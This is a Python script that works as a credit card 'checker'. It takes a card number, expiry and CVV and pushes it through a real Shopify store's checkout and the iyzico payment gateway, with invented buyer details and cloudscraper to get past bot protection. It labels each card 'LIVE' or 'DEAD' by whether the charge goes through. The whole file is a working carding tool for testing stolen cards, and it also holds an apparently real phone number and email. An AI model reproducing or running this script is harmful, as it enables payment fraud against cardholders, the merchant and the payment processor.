#!/usr/bin/env python3
import cloudscraper
import re
import json
import sys
import time

def find_between(s, start, end):
    try:
        if start in s and end in s:
            return (s.split(start))[1].split(end)[0]
        return ""
    except:
        return ""

def check_shopify(card):
    try:
        cc, mm, yy, cv = card.split('|')
        
        # Format month and year
        if len(mm) == 1:
            mm = f'0{mm}'
        if len(yy) == 2:
            yy = yy
        else:
            yy = yy[-2:]
        
        s = cloudscraper.create_scraper()
        
        # Step 1: Add to cart
        url = "https://www.viadellerose.com/cart/add.js"
        data = {
            "id": "50861281345875",
            "quantity": "1"
        }
        s.post(url, data=data, timeout=15)
        
        # Step 2: Get cart token
        response = s.get('https://www.viadellerose.com/cart.js', timeout=15)
        raw_token = response.json()['token']
        token = raw_token.split('?')[0]
        
        # Step 3: Go to cart
        cart_data = {
            'attributes[products_mobile_grid_mode]': '',
            'attributes[products_desktop_grid_mode]': '',
            'note': '',
            'checkout': '',
        }
        response_text2 = s.post('https://www.viadellerose.com/cart', data=cart_data, timeout=15).text
        
        # Step 4: Extract session data
        x_checkout_one_session_token = re.search(r'name="serialized-sessionToken"\s+content="&quot;([^"]+)&quot;"', response_text2)
        
        if not x_checkout_one_session_token:
            return {"status": "DEAD", "msg": "Failed to get session token"}
        
        session_token = x_checkout_one_session_token.group(1)
        queue_token = find_between(response_text2, 'queueToken&quot;:&quot;', '&quot;')
        stable_id = find_between(response_text2, 'stableId&quot;:&quot;', '&quot;')
        paymentMethodIdentifier = find_between(response_text2, 'paymentMethodIdentifier&quot;:&quot;', '&quot;')
        
        # Step 5: Get web pixels
        params = {'_r': 'AQABDuZDkhGEqDQhwZwhZGNZfYD4_KnEDpEbRrWcQ8xbpHk'}
        s.get(f'https://www.viadellerose.com/web-pixels@3c1f2529w4065d210p03530cb8m151179d6/custom/web-pixel-shopify-custom-pixel@0450/sandbox/modern/checkouts/cn/{token}/tr-tr', params=params, timeout=15)
        
        # Step 6: Proposal
        params = {'operationName': 'Proposal'}
        proposal_data = {
            'variables': {
                'sessionInput': {'sessionToken': session_token},
                'queueToken': queue_token,
                'discounts': {'lines': [], 'acceptUnexpectedDiscounts': True},
                'delivery': {
                    'deliveryLines': [{
                        'destination': {
                            'partialStreetAddress': {
                                'address1': 'steer 62888',
                                'address2': 'ceyhanlı',
                                'city': 'hudson',
                                'countryCode': 'TR',
                                'postalCode': '01010',
                                'firstName': 'exeee',
                                'lastName': 'waysss',
                                'phone': '5386461353',
                                'oneTimeUse': False,
                                'coordinates': {'latitude': 36.9884894, 'longitude': 35.3267348}
                            }
                        },
                        'selectedDeliveryStrategy': {
                            'deliveryStrategyByHandle': {
                                'handle': '325f2c29cef3feb63e04f23afb6f4815-f9e36e326f54a039c70739ea5057dbfe',
                                'customDeliveryRate': False
                            },
                            'options': {'phone': '5386461353'}
                        },
                        'targetMerchandiseLines': {'lines': [{'stableId': stable_id}]},
                        'deliveryMethodTypes': ['SHIPPING'],
                        'expectedTotalPrice': {'value': {'amount': '95.00', 'currencyCode': 'TRY'}},
                        'destinationChanged': False
                    }],
                    'noDeliveryRequired': [],
                    'useProgressiveRates': False,
                    'prefetchShippingRatesStrategy': None,
                    'supportsSplitShipping': True
                },
                'deliveryExpectations': {'deliveryExpectationLines': []},
                'merchandise': {
                    'merchandiseLines': [{
                        'stableId': stable_id,
                        'merchandise': {
                            'productVariantReference': {
                                'id': 'gid://shopify/ProductVariantMerchandise/50861281345875',
                                'variantId': 'gid://shopify/ProductVariant/50861281345875',
                                'properties': [],
                                'sellingPlanId': None,
                                'sellingPlanDigest': None
                            }
                        },
                        'quantity': {'items': {'value': 1}},
                        'expectedTotalPrice': {'value': {'amount': '350.00', 'currencyCode': 'TRY'}},
                        'lineComponentsSource': None,
                        'lineComponents': []
                    }]
                },
                'memberships': {'memberships': []},
                'payment': {
                    'totalAmount': {'any': True},
                    'paymentLines': [{
                        'paymentMethod': {
                            'directPaymentMethod': None,
                            'giftCardPaymentMethod': None,
                            'redeemablePaymentMethod': None,
                            'walletPaymentMethod': None,
                            'walletsPlatformPaymentMethod': None,
                            'localPaymentMethod': None,
                            'paymentOnDeliveryMethod': None,
                            'paymentOnDeliveryMethod2': None,
                            'manualPaymentMethod': None,
                            'customPaymentMethod': None,
                            'offsitePaymentMethod': {
                                'name': 'iyzico - Kredi ve Banka Kartları',
                                'paymentMethodIdentifier': paymentMethodIdentifier,
                                'billingAddress': {
                                    'streetAddress': {
                                        'address1': 'steer 62888',
                                        'address2': 'ceyhanlı',
                                        'city': 'hudson',
                                        'countryCode': 'TR',
                                        'postalCode': '01010',
                                        'firstName': 'exeee',
                                        'lastName': 'waysss',
                                        'phone': '5386461353'
                                    }
                                }
                            },
                            'customOnsitePaymentMethod': None,
                            'deferredPaymentMethod': None,
                            'customerCreditCardPaymentMethod': None,
                            'paypalBillingAgreementPaymentMethod': None,
                            'remotePaymentInstrument': None
                        },
                        'amount': {'any': True}
                    }],
                    'billingAddress': {
                        'streetAddress': {
                            'address1': 'steer 62888',
                            'address2': 'ceyhanlı',
                            'city': 'hudson',
                            'countryCode': 'TR',
                            'postalCode': '01010',
                            'firstName': 'exeee',
                            'lastName': 'waysss',
                            'phone': '5386461353'
                        }
                    }
                },
                'buyerIdentity': {
                    'customer': {'presentmentCurrency': 'TRY', 'countryCode': 'TR'},
                    'email': 'ksksksyhjkslythhks@gmail.com',
                    'emailChanged': False,
                    'phoneCountryCode': 'TR',
                    'marketingConsent': [],
                    'shopPayOptInPhone': {'number': '5386461353', 'countryCode': 'TR'},
                    'rememberMe': False
                },
                'tip': {'tipLines': []},
                'poNumber': None,
                'taxes': {
                    'proposedAllocations': None,
                    'proposedTotalAmount': None,
                    'proposedTotalIncludedAmount': {'value': {'amount': '31.82', 'currencyCode': 'TRY'}},
                    'proposedMixedStateTotalAmount': None,
                    'proposedExemptions': []
                },
                'note': {'message': None, 'customAttributes': []},
                'localizationExtension': {'fields': []},
                'scriptFingerprint': {
                    'signature': None,
                    'signatureUuid': None,
                    'lineItemScriptChanges': [],
                    'paymentScriptChanges': [],
                    'shippingScriptChanges': []
                },
                'optionalDuties': {'buyerRefusesDuties': False},
                'cartMetafields': []
            },
            'operationName': 'Proposal',
            'id': '95a8a140eea7d6e6554cfb57ab3b14e20b2bbdd72a1a8bc180e4a28918f3be8c'
        }
        
        s.post('https://www.viadellerose.com/checkouts/internal/graphql/persisted', params=params, json=proposal_data, timeout=15)
        
        # Step 7: Submit for completion
        params = {'operationName': 'SubmitForCompletion'}
        submit_data = {
            'variables': {
                'input': {
                    'sessionInput': {'sessionToken': session_token},
                    'queueToken': queue_token,
                    'discounts': {'lines': [], 'acceptUnexpectedDiscounts': True},
                    'delivery': {
                        'deliveryLines': [{
                            'destination': {
                                'streetAddress': {
                                    'address1': 'steer 62888',
                                    'address2': 'ceyhanlı',
                                    'city': 'hudson',
                                    'countryCode': 'TR',
                                    'postalCode': '01010',
                                    'firstName': 'exeee',
                                    'lastName': 'waysss',
                                    'zoneCode': 'new york',
                                    'phone': '5386461353',
                                    'oneTimeUse': False
                                }
                            },
                            'selectedDeliveryStrategy': {
                                'deliveryStrategyByHandle': {
                                    'handle': '325f2c29cef3feb63e04f23afb6f4815-f9e36e326f54a039c70739ea5057dbfe',
                                    'customDeliveryRate': False
                                },
                                'options': {'phone': '5386461353'}
                            },
                            'targetMerchandiseLines': {'lines': [{'stableId': stable_id}]},
                            'deliveryMethodTypes': ['SHIPPING'],
                            'expectedTotalPrice': {'value': {'amount': '95.00', 'currencyCode': 'TRY'}},
                            'destinationChanged': True
                        }],
                        'noDeliveryRequired': [],
                        'useProgressiveRates': False,
                        'prefetchShippingRatesStrategy': None,
                        'supportsSplitShipping': True
                    },
                    'deliveryExpectations': {'deliveryExpectationLines': []},
                    'merchandise': {
                        'merchandiseLines': [{
                            'stableId': stable_id,
                            'merchandise': {
                                'productVariantReference': {
                                    'id': 'gid://shopify/ProductVariantMerchandise/50861281345875',
                                    'variantId': 'gid://shopify/ProductVariant/50861281345875',
                                    'properties': [],
                                    'sellingPlanId': None,
                                    'sellingPlanDigest': None
                                }
                            },
                            'quantity': {'items': {'value': 1}},
                            'expectedTotalPrice': {'value': {'amount': '350.00', 'currencyCode': 'TRY'}},
                            'lineComponentsSource': None,
                            'lineComponents': []
                        }]
                    },
                    'memberships': {'memberships': []},
                    'payment': {
                        'totalAmount': {'any': True},
                        'paymentLines': [{
                            'paymentMethod': {
                                'directPaymentMethod': None,
                                'giftCardPaymentMethod': None,
                                'redeemablePaymentMethod': None,
                                'walletPaymentMethod': None,
                                'walletsPlatformPaymentMethod': None,
                                'localPaymentMethod': None,
                                'paymentOnDeliveryMethod': None,
                                'paymentOnDeliveryMethod2': None,
                                'manualPaymentMethod': None,
                                'customPaymentMethod': None,
                                'offsitePaymentMethod': {
                                    'name': 'iyzico - Kredi ve Banka Kartları',
                                    'paymentMethodIdentifier': paymentMethodIdentifier,
                                    'billingAddress': {
                                        'streetAddress': {
                                            'address1': 'steer 62888',
                                            'address2': 'ceyhanlı',
                                            'city': 'hudson',
                                            'countryCode': 'TR',
                                            'postalCode': '01010',
                                            'firstName': 'exeee',
                                            'lastName': 'waysss',
                                            'zoneCode': 'new york',
                                            'phone': '5386461353'
                                        }
                                    }
                                },
                                'customOnsitePaymentMethod': None,
                                'deferredPaymentMethod': None,
                                'customerCreditCardPaymentMethod': None,
                                'paypalBillingAgreementPaymentMethod': None,
                                'remotePaymentInstrument': None
                            },
                            'amount': {'value': {'amount': '445', 'currencyCode': 'TRY'}}
                        }],
                        'billingAddress': {
                            'streetAddress': {
                                'address1': 'steer 62888',
                                'address2': 'ceyhanlı',
                                'city': 'hudson',
                                'countryCode': 'TR',
                                'postalCode': '01010',
                                'firstName': 'exeee',
                                'lastName': 'waysss',
                                'zoneCode': 'new york',
                                'phone': '5386461353'
                            }
                        }
                    },
                    'buyerIdentity': {
                        'customer': {'presentmentCurrency': 'TRY', 'countryCode': 'TR'},
                        'email': 'ksksksyhjkslythhks@gmail.com',
                        'emailChanged': False,
                        'phoneCountryCode': 'TR',
                        'marketingConsent': [],
                        'shopPayOptInPhone': {'number': '5386461353', 'countryCode': 'TR'},
                        'rememberMe': False
                    },
                    'tip': {'tipLines': []},
                    'taxes': {
                        'proposedAllocations': None,
                        'proposedTotalAmount': None,
                        'proposedTotalIncludedAmount': {'value': {'amount': '31.82', 'currencyCode': 'TRY'}},
                        'proposedMixedStateTotalAmount': None,
                        'proposedExemptions': []
                    },
                    'note': {'message': None, 'customAttributes': []},
                    'localizationExtension': {'fields': []},
                    'scriptFingerprint': {
                        'signature': None,
                        'signatureUuid': None,
                        'lineItemScriptChanges': [],
                        'paymentScriptChanges': [],
                        'shippingScriptChanges': []
                    },
                    'optionalDuties': {'buyerRefusesDuties': False},
                    'cartMetafields': []
                },
                'attemptToken': f'{token}-m1kcb30e7b',
                'metafields': [],
                'analytics': {
                    'requestUrl': f'https://www.viadellerose.com/checkouts/cn/{token}/tr-tr?_r=AQABDuZDkhGEqDQhwZwhZGNZfYD4_KnEDpEbRrWcQ8xbpHk',
                    'pageId': 'a590a801-36DE-4B99-5FEB-D9B833B25682'
                }
            },
            'operationName': 'SubmitForCompletion',
            'id': 'd50b365913d0a33a1d8905bfe5d0ecded1a633cb6636cbed743999cfacefa8cb'
        }
        
        submit_response = s.post('https://www.viadellerose.com/checkouts/internal/graphql/persisted', params=params, json=submit_data, timeout=15)
        receipt = submit_response.json()['data']['submitForCompletion']['receipt']['id']
        
        # Step 8: Poll for receipt
        headers = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 15; 2409BRN2CA Build/AP3A.240905.015.A2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.7632.120 Mobile Safari/537.36',
            'Accept': 'application/json',
            'content-type': 'application/json',
            'x-checkout-one-session-token': session_token
        }
        
        params = {
            'operationName': 'PollForReceipt',
            'variables': json.dumps({'receiptId': receipt, 'sessionToken': session_token}),
            'id': 'baa45c97a49dae99440b5f8a954dfb31b01b7af373f5335204c29849f3397502'
        }
        
        max_attempts = 10
        for attempt in range(max_attempts):
            poll_response = s.get('https://www.viadellerose.com/checkouts/internal/graphql/persisted', params=params, headers=headers, timeout=15)
            poll_data = poll_response.json()
            
            typename = poll_data.get('data', {}).get('receipt', {}).get('__typename')
            
            if typename == 'ActionRequiredReceipt':
                checkout_url = poll_data['data']['receipt']['action']['url']
                payment_id = checkout_url.split('/')[-1]
                
                # Step 9: Get iyzico token
                headers2 = {
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36'
                }
                
                iyzico_response = s.get(f'https://api.iyzipay.com/v2/shopify/payment/checkout/retrieve/{payment_id}', headers=headers2, timeout=15)
                iyzico_match = re.search(r'token:"([^"]+)"', iyzico_response.text)
                
                if not iyzico_match:
                    return {"status": "DEAD", "msg": "Failed to get iyzico token"}
                
                iyzico_token = iyzico_match.group(1)
                
                # Step 10: Submit iyzico payment
                headers3 = {
                    'Accept': 'application/json',
                    'Content-Type': 'application/json',
                    'Origin': 'https://api.iyzipay.com',
                    'Referer': f'https://api.iyzipay.com/v2/shopify/payment/checkout/retrieve/{payment_id}',
                    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
                    'X-IYZI-TOKEN': iyzico_token
                }
                
                payment_data = {
                    'installment': 1,
                    'paidPrice': 445,
                    'paymentChannel': 'MOBILE_ANDROID',
                    'paymentCard': {
                        'cardNumber': cc,
                        'cardHolderName': 'ksksk sksl',
                        'expireYear': yy,
                        'expireMonth': mm,
                        'cvc': cv,
                        'registerConsumerCard': False,
                        'registerCard': 0
                    },
                    'browserFingerprint': {
                        'language': 'tr',
                        'timezone': -180,
                        'hasSessionStorage': True,
                        'hasLocalStorage': True,
                        'hasIndexedDb': True,
                        'hasOpenDb': True,
                        'platform': 'false',
                        'hasLiedLanguage': False,
                        'hasLiedResolution': False,
                        'hasLiedOS': False,
                        'hasLiedBrowser': False,
                        'maxTouchPoints': 0,
                        'touchEventSuccess': False,
                        'hasTouchStart': False,
                        'fingerprintHash': ''
                    }
                }
                
                final_response = s.post('https://api.iyzipay.com/payment/iyzipos/checkoutform/auth/ecom', headers=headers3, json=payment_data, timeout=15)
                final_text = final_response.text
                
                if 'success' in final_text.lower() or 'approved' in final_text.lower():
                    return {"status": "LIVE", "msg": "Payment successful"}
                elif 'declined' in final_text.lower():
                    return {"status": "DEAD", "msg": "Card declined"}
                else:
                    return {"status": "DEAD", "msg": "Payment failed"}
                    
            elif typename == 'ProcessedReceipt' or typename == 'ProcessingReceipt':
                time.sleep(1.5)
                continue
            else:
                return {"status": "DEAD", "msg": "Receipt error"}
        
        return {"status": "DEAD", "msg": "Timeout waiting for receipt"}
        
    except Exception as e:
        return {"status": "DEAD", "msg": str(e)}

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(json.dumps({"status": "DEAD", "msg": "No card provided"}))
        sys.exit(1)
    
    card = sys.argv[1]
    result = check_shopify(card)
    print(json.dumps(result))
